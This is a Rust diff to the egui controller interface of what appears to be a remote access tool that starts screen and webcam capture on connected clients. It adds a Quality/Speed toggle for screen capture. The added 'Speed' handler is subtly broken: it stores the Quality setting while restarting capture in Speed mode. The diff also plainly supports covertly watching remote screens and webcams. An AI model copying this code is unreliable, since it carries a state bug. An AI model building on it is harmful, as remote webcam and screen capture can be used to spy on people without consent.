@@ -1,10 +1,10 @@
 use crate::manager::types::UiManagerCommand;
 use egui::{
-    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, Stroke,
+    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton, Stroke,
     TextureHandle, Window,
 };
 use shared::commands::{
-    CaptureCommand, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
+    CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
 };
 use tokio::sync::mpsc::UnboundedSender;
 
@@ -35,9 +35,14 @@ impl Default for ClientViewCaptureState {
         }
     }
 }
+
+pub struct ClientViewCapture {
+    pub quality: CaptureQuality,
+    pub data: Option<ColorImage>,
+}
 pub struct ClientViewCaptures {
-    pub screen: Option<ColorImage>,
-    pub webcam: Option<ColorImage>,
+    pub screen: ClientViewCapture,
+    pub webcam: ClientViewCapture,
 }
 pub struct ClientViewTextures {
     pub screen: Option<TextureHandle>,
@@ -70,8 +75,14 @@ impl ClientView {
             state: ClientViewState {
                 visible: false,
                 captures: ClientViewCaptures {
-                    screen: None,
-                    webcam: None,
+                    screen: ClientViewCapture {
+                        quality: CaptureQuality::Speed,
+                        data: None,
+                    },
+                    webcam: ClientViewCapture {
+                        quality: CaptureQuality::Speed,
+                        data: None,
+                    },
                 },
                 textures: ClientViewTextures {
                     screen: None,
@@ -99,7 +110,7 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                     CollapsingHeader::new("Screen")
                         .default_open(false)
                         .show(ui, |ui| {
-                            if let Some(ref image) = view.state.captures.screen {
+                            if let Some(ref image) = view.state.captures.screen.data {
                                 if view.state.textures.screen.is_none() {
                                     view.state.textures.screen = Some(ui.ctx().load_texture(
                                         format!("capture_{}", view.mutex.clone()),
@@ -135,12 +146,69 @@ pub fn render(ctx: &Context, view: &mut ClientView) {
                                     let _ = view.sender.send(UiManagerCommand::SendCommand(
                                         view.mutex.clone(),
                                         Command::Capture(
-                                            CaptureCommand::Start,
+                                            CaptureCommand::Start(
+                                                view.state.captures.screen.quality.clone(),
+                                            ),
                                             CaptureType::Screen,
                                         ),
                                     ));
                                     view.state.capturing.screen = true;
                                 };
+                            }
+
+                            //////////////////////////////////////
+                            // quality toggle
+                            if ui
+                                .add(RadioButton::new(
+                                    view.state.captures.screen.quality == CaptureQuality::Quality,
+                                    "Quality",
+                                ))
+                                .clicked()
+                            {
+                                if view.state.captures.screen.quality == CaptureQuality::Quality {
+                                    return; // don't restart for no reason
+                                }
+                                view.state.captures.screen.quality = CaptureQuality::Quality;
+                                // stop capture
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(
+                                    view.mutex.clone(),
+                                    Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
+                                ));
+                                // start capture
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(
+                                    view.mutex.clone(),
+                                    Command::Capture(
+                                        CaptureCommand::Start(CaptureQuality::Quality),
+                                        CaptureType::Screen,
+                                    ),
+                                ));
+                            }
+                            // speed toggle
+
+                            if ui
+                                .add(RadioButton::new(
+                                    view.state.captures.screen.quality == CaptureQuality::Speed,
+                                    "Speed",
+                                ))
+                                .clicked()
+                            {
+                                if view.state.captures.screen.quality == CaptureQuality::Speed {
+                                    return; // don't restart for no reason
+                                }
+                                view.state.captures.screen.quality = CaptureQuality::Quality;
+                                // stop capture
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(
+                                    view.mutex.clone(),
+                                    Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
+                                ));
+                                // start capture
+                                let _ = view.sender.send(UiManagerCommand::SendCommand(
+                                    view.mutex.clone(),
+                                    Command::Capture(
+                                        CaptureCommand::Start(CaptureQuality::Speed),
+                                        CaptureType::Screen,
+                                    ),
+                                ));
                             }
                         });
                 });
